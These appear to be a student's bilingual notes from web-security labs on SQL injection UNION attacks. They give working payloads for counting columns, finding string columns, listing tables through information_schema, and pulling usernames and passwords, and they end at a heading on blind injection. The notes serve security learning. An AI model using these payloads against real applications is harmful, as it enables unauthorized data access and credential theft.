# SQL injection UNION attacks
## Retrieving data from other database tables

# *извлечение данных из таблиц

тут было 4 лабы 

## Determining the number of columns required
==определял число коллок в таблице ответа чтобы понять как выводить через UNION данные потом==

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```
## Finding columns with a useful data type
==определял типы этих колонок чтобы найти строковые типы чтобы уже в стоковых типах выводить много данных нужных нам==

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

## Using a SQL injection UNION attack to retrieve interesting data
==выводил все таблицы, потом  столбцы таблицы нужной, потом данные конкретных табилц==

```sql
' UNION SELECT username, password FROM users--

' UNION SELECT NULL, column_name ,NULL 
FROM information_schema.columns 
 WHERE table_name='users'--
```

```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```
так получу все табилицы вообще 
// но есди добавить WHERE table_schema='public'-- то получу только публичные табл
## Retrieving multiple values within a single column
==научился не только выводить данные - но и помещать с помощью конкатенации много данных в одной колонке таблицы!==


```sql
' UNION SELECT username || '~' || password FROM users--

' UNION SELECT   NULL,
   'ID: '||id||    'Name: '  ||   name  ||   'Category: ' ||category||
   'Price: $'||price||
   'Rating: '||rating,
   NULL 
  FROM products--
```

==*ДАЛЕЕ ИДЕТ НОВАЯ ПОДТЕМА sqli 
## Blind SQL injection vulnerabilities
слепые иньекции!!!! sql
